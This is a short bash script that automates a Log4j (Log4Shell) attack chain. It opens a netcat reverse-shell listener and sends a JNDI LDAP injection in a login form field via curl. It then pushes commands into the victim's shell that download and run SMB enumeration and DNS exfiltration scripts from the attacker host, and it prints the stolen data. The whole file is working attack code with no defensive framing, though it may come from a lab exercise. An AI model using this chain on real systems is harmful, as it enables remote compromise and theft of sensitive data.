#!/bin/bash

### LOG4J Automated Exploit Script with seperate sessions

# Setup a netcat listener in a new screen session
screen -S netcat -d -m bash -c "nc -nvlp 9001 -s 10.0.0.3; exec sh"
echo "[x] Netcat Listener Configured"
sleep 2

# Run the Exploitation Script (Sets up LDAP- and Python Webservers)
screen -S exploit -d -m bash -c "python3 poc.py --userip 10.0.0.3 --webport 8000 --lport 9001"
echo "[x] LDAP and Python Webserver running"
sleep 10    # Needs this sleep to setup the servers

# Issue the curl request:
curl -i -s -k -X $'POST' -H $'Host: 172.16.0.6:8080' --data-binary $'uname=%24%7Bjndi%3Aldap%3A%2F%2F10.0.0.3%3A1389%2Fa%7D&password=' $'http://172.16.0.6:8080/login' &
echo "[x] Curl request sent"

# Execute commands inside the reverse shell with the victim (Reverse Shell Proof-of-Concept)
screen -S netcat -X stuff 'hostname;id^M'


# To run it over the screen session:
screen -S netcat -X stuff 'wget 10.0.0.3:8000/smbenumeration.sh^M'
screen -S netcat -X stuff 'bash smbenumeration.sh^M'
echo "[x] Conducting SMB Enumeration"

# 
screen -S dns_exfil -d -m bash -c "python2 /root/log4j/dns_exfil/dnsteal.py 10.0.0.3 -z -v; exec sh"
echo "[x] Local DNS server configured"
sleep 10

# DNS Exfiltration
# This sends over the sensitive information through DNS to the attacker over the netcat reverse shell:
screen -S netcat -X stuff 'wget 10.0.0.3:8000/dns_exfil.sh^M'
screen -S netcat -X stuff 'bash dns_exfil.sh^M'
echo "[x] Retrieved sensitive data over DNS"

# Making sure that the DNS server stops listening and stores the transferred information
screen -S dns_exfil -X stuff '\003'

# Printing Sensitive information
echo "[x] Printing Receieved data"
cat recieved*
